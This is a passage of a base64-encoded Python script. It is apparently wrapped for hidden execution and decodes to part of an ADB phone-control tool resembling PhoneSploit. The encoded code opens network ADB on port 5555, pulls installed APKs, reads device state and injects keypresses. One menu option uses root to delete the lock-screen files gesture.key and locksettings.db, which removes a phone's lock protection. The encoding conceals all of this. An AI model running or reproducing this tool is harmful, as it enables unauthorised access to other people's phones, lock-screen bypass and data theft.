lLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHBtIHBhdGggIitwYWNrYWdlX25hbWUpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgICAgW3swfSt7MX1dRW50ZXIgVGhlIHBhdGgubG9va3MgbGlrZSB0aGlzIC9kYXRhL2FwcC9jb20uc25hcGNoYXQuYW5kcm9pZC1xV2dEY0JpQ0V2QU5xNm9wX05QcWVBPT0vYmFzZS5hcGsiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwYXRoID0gcmF3X2lucHV0KCIgICAgICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihwdWxsX2FwaykgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgICAgICAgIFt7MH0rezF9XUVudGVyIFRoZSBsb2NhdGlvbiB0byBzdG9yZSB0aGUgYXBrOiBbRGVmYXVsdDogcHJlc2VudCB3b3JraW5nIGRpcmVjdG9yeV0iKSAgLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIGxvY2F0aW9uID0gICByYXdfaW5wdXQoIiAgICAgICAgICAgICIrYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihwdWxsX2FwaykgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrIiBwdWxsICIrcGF0aCsiICIrbG9jYXRpb24pCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMjAnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBkdW1wc3lzIGJhdHRlcnkiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzIxJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrICIgc2hlbGwgbmV0c3RhdCIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMjInOgogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV0gVG8gdHVybiB3aWZpIGJhY2sgb24geW91IG5lZWQgdGhlIGRldmljZSB0byBiZSBwbHVnZWQgaW4uIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBvbl9vZmYgPSByYXdfaW5wdXQoRm9yZS5XSElURSArICIgICAgWyIrRm9yZS5SRUQrIisiK0ZvcmUuV0hJVEUrIl1Xb3VsZCB5b3UgbGlrZSB0aGUgd2lmaSAiK0ZvcmUuR1JFRU4gKyJvbiIrRm9yZS5XSElURSArIi8iK0ZvcmUuUkVEICsib2ZmICIrRm9yZS5XSElURSkKICAgICAgICAgICAgaWYgb25fb2ZmID09ICdvZmYnOgogICAgICAgICAgICAgICAgY29tbWFuZCA9ICIgc2hlbGwgc3ZjIHdpZmkgZGlzYWJsZSIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiIHNoZWxsIHN2YyB3aWZpIGVuYWJsZSIKCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrY29tbWFuZCkKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyMyc6CiAgICAgICAgICAgIHByaW50ICgoRm9yZS5XSElURSArICIgICAgW3swfSt7MX1dezF9VEhFIERFVklDRSBORUVEUyBUTyBCRSBST09URUQgVE8gQ09OVElOVUUgVE8gRVhJVCBVU0UgQ1RSTCArQyBUSElTIElTIEFMU08gVU5URVNURUQiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50IChGb3JlLlJFRCArICIqKioqKioqKioqKioqKioqKipUUllJTkcgVE8gUkVNT1ZFIFBBU1MqKioqKioqKioqKioqKioqKioiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc3UgMCAncm0gL2RhdGEvc3lzdGVtL2dlc3R1cmUua2V5JyIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vbG9ja3NldHRpbmdzLmRiJyIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vbG9ja3NldHRpbmdzLmRiLXdhbCciKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc3UgMCAncm0gL2RhdGEvc3lzdGVtL2xvY2tzZXR0aW5ncy5kYi1zaG0nIikKICAgICAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgIioqKioqKioqKioqKioqKioqKlRSWUlORyBUTyBSRU1PVkUgUEFTUyoqKioqKioqKioqKioqKioqKiIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMjQnOgogICAgICAgICAgICBwcmludCAoJycnCiAgICAwIC0tPiAgIktFWUNPREVfVU5LTk9XTiIKICAgIDEgLS0+ICAiS0VZQ09ERV9NRU5VIgogICAgMiAtLT4gICJLRVlDT0RFX1NPRlRfUklHSFQiCiAgICAzIC0tPiAgIktFWUNPREVfSE9NRSIKICAgIDQgLS0+ICAiS0VZQ09ERV9CQUNLIgogICAgNSAtLT4gICJLRVlDT0RFX0NBTEwiCiAgICA2IC0tPiAgIktFWUNPREVfRU5EQ0FMTCIKICAgIDcgLS0+ICAiS0VZQ09ERV8wIgogICAgOCAtLT4gICJLRVlDT0RFXzEiCiAgICA5IC0tPiAgIktFWUNPREVfMiIKICAgIDEwIC0tPiAgIktFWUNPREVfMyIKICAgIDExIC0tPiAgIktFWUNPREVfNCIKICAgIDEyIC0tPiAgIktFWUNPREVfNSIKICAgIDEzIC0tPiAgIktFWUNPREVfNiIKICAgIDE0IC0tPiAgIktFWUNPREVfNyIKICAgIDE1IC0tPiAgIktFWUNPREVfOCIKICAgIDE2IC0tPiAgIktFWUNPREVfOSIKICAgIDE3IC0tPiAgIktFWUNPREVfU1RBUiIKICAgIDE4IC0tPiAgIktFWUNPREVfUE9VTkQiCiAgICAxOSAtLT4gICJLRVlDT0RFX0RQQURfVVAiCiAgICAyMCAtLT4gICJLRVlDT0RFX0RQQURfRE9XTiIKICAgIDIxIC0tPiAgIktFWUNPREVfRFBBRF9MRUZUIgogICAgMjIgLS0+ICAiS0VZQ09ERV9EUEFEX1JJR0hUIgogICAgMjMgLS0+ICAiS0VZQ09ERV9EUEFEX0NFTlRFUiIKICAgIDI0IC0tPiAgIktFWUNPREVfVk9MVU1FX1VQIgogICAgMjUgLS0+ICAiS0VZQ09ERV9WT0xVTUVfRE9XTiIKICAgIDI2IC0tPiAgIktFWUNPREVfUE9XRVIiCiAgICAyNyAtLT4gICJLRVlDT0RFX0NBTUVSQSIKICAgIDI4IC0tPiAgIktFWUNPREVfQ0xFQVIiCiAgICAyOSAtLT4gICJLRVlDT0RFX0EiCiAgICAzMCAtLT4gICJLRVlDT0RFX0IiCiAgICAzMSAtLT4gICJLRVlDT0RFX0MiCiAgICAzMiAtLT4gICJLRVlDT0RFX0QiCiAgICAzMyAtLT4gICJLRVlDT0RFX0UiCiAgICAzNCAtLT4gICJLRVlDT0RFX0YiCiAgICAzNSAtLT4gICJLRVlDT0RFX0ciCiAgICAzNiAtLT4gICJLRVlDT0RFX0giCiAgICAzNyAtLT4gICJLRVlDT0RFX0kiCiAgICAzOCAtLT4gICJLRVlDT0RFX0oiCiAgICAzOSAtLT4gICJLRVlDT0RFX0siCiAgICA0MCAtLT4gICJLRVlDT0RFX0wiCiAgICA0MSAtLT4gICJLRVlDT0RFX00iCiAgICA0MiAtLT4gICJLRVlDT0RFX04iCiAgICA0MyAtLT4gICJLRVlDT0RFX08iCiAgICA0NCAtLT4gICJLRVlDT0RFX1AiCiAgICA0NSAtLT4gICJLRVlDT0RFX1EiCiAgICA0NiAtLT4gICJLRVlDT0RFX1IiCiAgICA0NyAtLT4gICJLRVlDT0RFX1MiCiAgICA0OCAtLT4gICJLRVlDT0RFX1QiCiAgICA0OSAtLT4gICJLRVlDT0RFX1UiCiAgICA1MCAtLT4gICJLRVlDT0RFX1YiCiAgICA1MSAtLT4gICJLRVlDT0RFX1ciCiAgICA1MiAtLT4gICJLRVlDT0RFX1giCiAgICA1MyAtLT4gICJLRVlDT0RFX1kiCiAgICA1NCAtLT4gICJLRVlDT0RFX1oiCiAgICA1NSAtLT4gICJLRVlDT0RFX0NPTU1BIgogICAgNTYgLS0+ICAiS0VZQ09ERV9QRVJJT0QiCiAgICA1NyAtLT4gICJLRVlDT0RFX0FMVF9MRUZUIgogICAgNTggLS0+ICAiS0VZQ09ERV9BTFRfUklHSFQiCiAgICA1OSAtLT4gICJLRVlDT0RFX1NISUZUX0xFRlQiCiAgICA2MCAtLT4gICJLRVlDT0RFX1NISUZUX1JJR0hUIgogICAgNjEgLS0+ICAiS0VZQ09ERV9UQUIiCiAgICA2MiAtLT4gICJLRVlDT0RFX1NQQUNFIgogICAgNjMgLS0+ICAiS0VZQ09ERV9TWU0iCiAgICA2NCAtLT4gICJLRVlDT0RFX0VYUExPUkVSIgogICAgNjUgLS0+ICAiS0VZQ09ERV9FTlZFTE9QRSIKICAgIDY2IC0tPiAgIktFWUNPREVfRU5URVIiCiAgICA2NyAtLT4gICJLRVlDT0RFX0RFTCIKICAgIDY4IC0tPiAgIktFWUNPREVfR1JBVkUiCiAgICA2OSAtLT4gICJLRVlDT0RFX01JTlVTIgogICAgNzAgLS0+ICAiS0VZQ09ERV9FUVVBTFMiCiAgICA3MSAtLT4gICJLRVlDT0RFX0xFRlRfQlJBQ0tFVCIKICAgIDcyIC0tPiAgIktFWUNPREVfUklHSFRfQlJBQ0tFVCIKICAgIDczIC0tPiAgIktFWUNPREVfQkFDS1NMQVNIIgogICAgNzQgLS0+ICAiS0VZQ09ERV9TRU1JQ09MT04iCiAgICA3NSAtLT4gICJLRVlDT0RFX0FQT1NUUk9QSEUiCiAgICA3NiAtLT4gICJLRVlDT0RFX1NMQVNIIgogICAgNzcgLS0+ICAiS0VZQ09ERV9BVCIKICAgIDc4IC0tPiAgIktFWUNPREVfTlVNIgogICAgNzkgLS0+ICAiS0VZQ09ERV9IRUFEU0VUSE9PSyIKICAgIDgwIC0tPiAgIktFWUNPREVfRk9DVVMiCiAgICA4MSAtLT4gICJLRVlDT0RFX1BMVVMiCiAgICA4MiAtLT4gICJLRVlDT0RFX01FTlUiCiAgICA4MyAtLT4gICJLRVlDT0RFX05PVElGSUNBVElPTiIKICAgIDg0IC0tPiAgIktFWUNPREVfU0VBUkNIIgogICAgODUgLS0+ICAiVEFHX0xBU1RfS0VZQ09ERSIKICAgICAgICAgICAgJycnKQogICAgICAgICAgICBwcmludCAoKCJbezB9K3sxfV1FbnRlciBhIG51bWJlci4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBudW0gPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihrZXljb2RlKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgaW5wdXQga2V5ZXZlbnQgIitudW0pCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMjUnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBkdW1wc3lzIGFjdGl2aXR5IikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcwJzoKICAgICAgICAgICAgZ2xvYmFsIHBhZ2UyCiAgICAgICAgICAgIGlmIHBhZ2UyID09IFRydWU6CiAgICAgICAgICAgICAgICBjbGVhcihwYWdlXzIpCiAgICAgICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNsZWFyKHBhZ2VfMSkKICAgICAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lIitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAncCc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwYWdlMiA9IFRydWUKICAgICAgICAgICAgYmFubmVyX3RpdGxlID0gcmFuZG9tLmNob2ljZShbbG9nb19kZXNpZ25fMSxsb2dvX2Rlc2lnbl8yLGxvZ29fZGVzaWduXzMsbG9nb19kZXNpZ25fNF0pCiAgICAgICAgICAgIHByaW50IChGb3JlLlJFRCArIGJhbm5lcl90aXRsZSkKICAgICAgICAgICAgcHJpbnQgKHBhZ2VfMikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICdiJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIHBhZ2UyID0gRmFsc2UKICAgICAgICAgICAgYmFubmVyX3RpdGxlID0gcmFuZG9tLmNob2ljZShbbG9nb19kZXNpZ25fMSxsb2dvX2Rlc2lnbl8yLGxvZ29fZGVzaWduXzMsbG9nb19kZXNpZ25fNF0pCiAgICAgICAgICAgIHByaW50IChGb3JlLlJFRCArIGJhbm5lcl90aXRsZSkKICAgICAgICAgICAgcHJpbnQgKHBhZ2VfMSkKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmUiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICc5OSc6CiAgICAgICAgICAgIGV4aXQoKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiZXJyb3I6IGludmFsaWQgbWVudSBvcHRpb24iKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZSIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCgogICAgbWFpbigpCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCmRlZiBjbGVhcihwYWdlKToKICAgIGdsb2JhbCBwYWdlMgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKICAgIHByaW50IChGb3JlLlJFRCArIGJhbm5lcl90aXRsZSkgICAgCiAgICBwcmludCAocGFnZSkKCgoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09ICAKIyBSdW4KeW4gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJIYXZlIHlvdSBhbHJlYWR5IGluc3RhbGxlZCBhZGIgdmlhIGNvbW1hbmQgbGluZSAiK0ZvcmUuR1JFRU4gKyAiWSIrRm9yZS5XSElURSsiLyIrRm9yZS5SRUQrIm4gIitGb3JlLldISVRFKQppZiB5biA9PSAibiI6CiAgICBvcy5zeXN0ZW0oInN1ZG8gYXB0IGluc3RhbGwgYWRiIikKcHJpbnQgKEZvcmUuUkVEICsgIlN0YXJ0aW5nICBhZGIgc2VydmVyLi4iKQpvcy5zeXN0ZW0oImFkYiB0Y3BpcCA1NTU1IikKdC5zbGVlcCg0KQpvcy5zeXN0ZW0oJ2NsZWFyJykKYmFubmVyX3RpdGxlID0gcmFuZG9tLmNob2ljZShbbG9nb19kZXNpZ25fMSxsb2dvX2Rlc2lnbl8yLGxvZ29fZGVzaWduXzMsbG9nb19kZXNpZ25fNF0pCnByaW50IChGb3JlLlJFRCArIGJhbm5lcl90aXRsZSkKcHJpbnQgKHBhZ2VfMSkKbWFpbigpCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoAAAA="))
